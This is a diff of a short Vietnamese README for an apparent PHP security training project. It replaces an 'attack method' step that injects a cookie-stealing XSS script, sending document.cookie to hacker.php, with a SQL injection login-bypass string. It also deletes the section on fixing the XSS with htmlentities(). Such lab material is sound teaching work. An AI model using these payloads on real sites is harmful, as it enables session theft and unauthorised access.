@@ -1,10 +1,6 @@
 # Cách tấn công
 
-- Ấn vào Add new user -> phần name điền như sau -> `<script>window.location.href = "hacker.php?cookie=" + document.cookie</script>` -> Submit
-
-# Khắc phục bị tấn công
-
-- Thêm `htmlentities()` vào khi xuất value ra table -> VD: `<?php echo htmlentities($user['name'])?>`
+- Ấn vào Login -> phần username điền như sau -> `user" OR "1"="1 --` -> Submit
 
 # php-training
 
